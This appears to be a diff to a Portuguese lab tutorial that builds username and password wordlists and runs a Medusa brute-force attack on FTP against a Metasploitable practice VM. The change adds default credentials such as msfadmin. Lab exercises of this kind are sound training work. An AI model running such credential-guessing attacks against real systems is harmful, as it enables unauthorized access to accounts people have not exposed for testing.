@@ -35,7 +35,7 @@ Configure ambas com:
 No Metasploitable:
 
 ```bash
-ifconfig
+ip a
 ```
 
 Exemplo de IP:
@@ -50,16 +50,33 @@ Exemplo de IP:
 
 ### Criar wordlist:
 
+Users:
+
 ```bash
-nano wordlist.txt
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 ```
 
 Conteúdo:
 
 ```
+user
+msfadmin
 admin
+oot
+```
+
+PassWord:
+
+```bash
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+```
+
+Conteúdo:
+
+```
 123456
 password
+qwerty
 msfadmin
 ```
 
@@ -68,7 +85,7 @@ msfadmin
 ### Executar ataque:
 
 ```bash
-medusa -h 192.168.56.101 -u msfadmin -P wordlist.txt -M ftp
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 ```
 
 
